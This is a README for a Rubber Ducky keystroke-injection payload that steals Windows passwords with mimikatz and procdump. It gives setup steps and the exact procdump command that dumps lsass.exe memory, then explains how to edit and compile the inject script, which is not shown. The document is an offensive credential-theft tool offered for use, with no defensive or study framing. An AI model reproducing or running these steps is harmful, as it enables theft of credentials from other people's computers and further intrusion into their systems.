# payload-mimikatz-procdump-for-rubber-ducky:
 A payload for extract the passwords of a windows computer with mimikatz & procdump.

# Requeriments:
 1. Rubber ducky
 2. Twin duck firmware
 3. VS or msbuild to compile the mimikatz
 4. Windows (better windows 10)
 5. java

# Instructions:
 1. Compile the mimikatz.sln with VS or msbuild.
 2. start a cmd on the path of the procdump.exe and execute this command for a 32 bits: "procdump.exe -accepteula -ma lsass.exe lsass.dmp" or "procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp" for 64 bits.
 3. Edit the lines 33, 34, 36 and 42 of the inject.txt
 4. Now we can compile the inject, only run this command in the path of the inject.txt with the cmd: "java -jar ducky.jar -i inject.txt -o inject.bin" if you don't use the US keyboard, you need to extract the file with the propierties of your keyboard from the resources folder, then, you have to run this command instead: "java -jar ducky.jar -i inject.txt -o inject.bin -l HERE THE NAME OF YOUR PROPIERTIES FILE".